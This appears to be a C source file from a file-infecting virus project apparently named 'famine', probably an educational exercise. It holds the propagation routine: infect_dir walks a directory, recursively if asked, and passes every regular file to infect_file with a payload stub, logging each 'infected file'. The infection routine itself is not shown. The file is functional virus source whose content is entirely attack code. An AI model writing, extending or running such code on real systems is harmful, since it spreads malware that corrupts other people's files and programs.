#include "../include/famine.h"

enum entry_kind { KIND_OTHER, KIND_REG, KIND_DIR };

static enum entry_kind classify(const char *path, const struct linux_dirent64 *ent)
{
	struct stat st;

	if (ent->d_type == DT_REG)
		return (KIND_REG);
	if (ent->d_type == DT_DIR)
		return (KIND_DIR);
	if (ent->d_type != DT_UNKNOWN)
		return (KIND_OTHER);
	if (lstat(path, &st) < 0)
		return (KIND_OTHER);
	if (S_ISREG(st.st_mode))
		return (KIND_REG);
	if (S_ISDIR(st.st_mode))
		return (KIND_DIR);
	return (KIND_OTHER);
}

// Builds "<dir>/<name>" into buf; returns 0 on success, 1 if it won't fit
static int join_path(char *buf, size_t size, const char *dir, const char *name)
{
	size_t dlen;
	size_t nlen;

	dlen = strlen(dir);
	nlen = strlen(name);
	if (dlen + 1 + nlen + 1 > size)
		return (1);
	memcpy(buf, dir, dlen);
	buf[dlen] = '/';
	memcpy(buf + dlen + 1, name, nlen);
	buf[dlen + 1 + nlen] = '\0';
	return (0);
}

void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len, size_t placeholders_offset, bool recursive)
{
	struct my_DIR			d;
	struct linux_dirent64	*ent;
	char					path[PATH_MAX];

	if (!opendir(&d, dir))
		return ;
	while ((ent = readdir(&d)) != NULL)
	{
		if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
			continue ;
		if (join_path(path, sizeof(path), dir, ent->d_name))
			continue ;
		switch (classify(path, ent))
		{
			case KIND_REG:
				infect_file(path, stub, stub_len, placeholders_offset);
				LOG("infected file: %s\n", path);
				break ;
			case KIND_DIR:
				if (recursive)
					infect_dir(path, stub, stub_len, placeholders_offset, recursive);
				break ;
			default:
				break ;
		}
	}
	closedir(&d);
	LOG("infected directory: %s\n", dir);
}

